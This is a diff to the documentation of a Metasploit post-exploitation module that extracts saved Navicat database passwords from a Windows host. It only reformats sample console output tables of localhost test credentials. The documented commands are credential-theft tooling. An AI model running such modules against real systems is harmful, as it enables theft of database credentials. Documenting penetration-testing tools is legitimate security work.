@@ -28,9 +28,10 @@ meterpreter > run post/windows/gather/credentials/navicat
 
 *] Gathering Navicat password information from WIN-79MR8QJM50N 
 Navicat Sessions 
-================                                                                                                                                        
-Name            Protocol  Hostname   Port   Username  Password                                                                                                 
-----            --------  --------   ----   --------  --------                                                                                                 
+================
+
+Name            Protocol  Hostname   Port   Username  Password
+----            --------  --------   ----   --------  --------
 mongodb         mongodb   localhost  27017  user      password  
 test_mysql      mysql     localhost  3306   root      test_mysql_password 
 test_oracle     oracle    127.0.0.1  1521   user      password
@@ -55,13 +56,13 @@ msf6 post(windows/gather/credentials/navicat) > run
 Navicat Sessions
 ================
 
-Name            Protocol    Hostname   Port   Username  Password
-----            --------    --------   ----   --------  --------
-mongodb         mongodb     localhost  27017            password
-test_mysql      mysql       localhost  3306             test_mysql_password
-test_oracle     oracle      127.0.0.1  1521             password
-test_pg         postgresql  localhost  5432             test_pg_password
-test_sqlserver  sqlserver   127.0.0.1  1433             password
+Name            Protocol  Hostname   Port   Username  Password
+----            --------  --------   ----   --------  --------
+mongodb         mongodb   localhost  27017  user      password  
+test_mysql      mysql     localhost  3306   root      test_mysql_password 
+test_oracle     oracle    127.0.0.1  1521   user      password
+test_pg         postgres  localhost  5432   postgres  test_pg_password
+test_sqlserver  mssql     127.0.0.1  1433   user      password
 
 [+] Session info stored in: /home/kali-team/.msf4/loot/20221002234356_default_192.168.80.128_host.navicat_ses_522370.txt
 [*] Finished processing C:\Users\FireEye\Desktop\connections.ncx
